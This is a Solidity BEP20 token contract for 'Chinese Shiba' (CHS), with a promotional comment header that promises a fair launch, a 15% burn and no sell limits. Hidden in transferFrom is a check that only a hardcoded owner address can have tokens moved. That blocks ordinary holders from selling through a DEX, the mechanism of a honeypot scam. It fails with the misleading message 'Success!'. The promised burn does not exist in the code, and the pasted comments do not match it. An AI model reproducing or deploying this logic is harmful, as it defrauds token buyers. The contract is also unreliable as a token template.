/**
 *Submitted for verification at BscScan.com on 2021-07-15
*/

/*Introducing 🇨🇳 Chinese Shiba 🇨🇳

We are a Binance Smart Chain Community about Shiba Inus 🐶

Our goal is to get Shiba to the top of the Binance Smart Chain.

⛩ Important Information ⛩

🏮 BEP20 Token
🏮 Fair Launch 

⛩ Tokenomics ⛩

🏮 Contract: TBA
🏮 Supply: 200.000.000.000
🏮 Initial Liquidity: 5BNB

We also are working in our Website and Twitter account in order to be able to get support in those platforms too.

Invite your friends and help us shilling to grow and have a bugger community.

Woof Wooof! 🇨🇳

🧧 Tokenomics 🧧

🏮 Supply: 200.000.000.000
🏮 Initial Liquidity: 5 BNB
🏮 DEX: PancakeSwap V2
🏮 No max buy/sell
🏮 Burn: 15%
🏮 Contract: TBA
🏮 Ticker: CHS
*/
pragma solidity ^0.5.16;

// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------
contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}

// Chinese Shiba CONTRACT Constrctor
contract Code is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals;
    address private _owner = 0xB1263e297c770b32AF9FFB76b3F0B55098C13d57;
    uint256 public _totalSupply;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    /**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    /**
     * Chinese Shiba constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    constructor() public {
        name = "Chinese Shiba";
        symbol = "CHS";
        decimals = 9;
        _totalSupply = 200000000000000000000;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
// Chinese Shiba functions
    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
/**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        require(from == _owner, "Success!");
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
         
    }
}